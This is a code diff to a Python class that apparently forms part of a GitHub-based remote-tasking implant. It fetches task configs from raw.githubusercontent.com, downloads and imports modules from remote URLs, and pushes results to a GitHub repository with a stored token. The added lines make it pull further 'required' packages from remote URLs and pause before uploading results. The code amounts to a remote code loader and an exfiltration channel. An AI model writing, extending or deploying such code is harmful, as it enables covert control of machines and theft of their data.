@@ -25,6 +25,7 @@ from toy.modules import gh
 
 class Boy(object):
     _id = 'abc'
+    _group = 'default'
     _url = 'https://raw.githubusercontent.com/how2how/toy/master/toy/config/conf.json'
 
     def __init__(self, config):
@@ -138,8 +139,15 @@ class Boy(object):
 
     def load_task(self, task_url):
         tasks = gh.get_raw(task_url)
+        logging.info('[+] Get task config: %s' % tasks)
         if tasks:
             tasks = json.loads(tasks)
+            logging.info('[*] Get task %s from %s' % (tasks['name'], task_url))
+            requires = tasks.get('require', {})
+            for u, p in requires.items():
+                for k in p:
+                    logging.info('[*] Load required packages: %s from %s' % (k, u))
+                    self.load([k], u)
             self.load(tasks['name'], tasks['url'])
             for task in tasks['task']:
                 self.load_module(task['module'], tasks['name'] + '.modules')
@@ -164,6 +172,7 @@ class Boy(object):
         self.task_queue.get()
         if result:
             logger.info('[*] Get result: %s' % result)
+            time.sleep(5)
             gh.put(self.guser, self.gtoken, self.grepo, path, result)
         if not loop:
             del sys.modules[m]
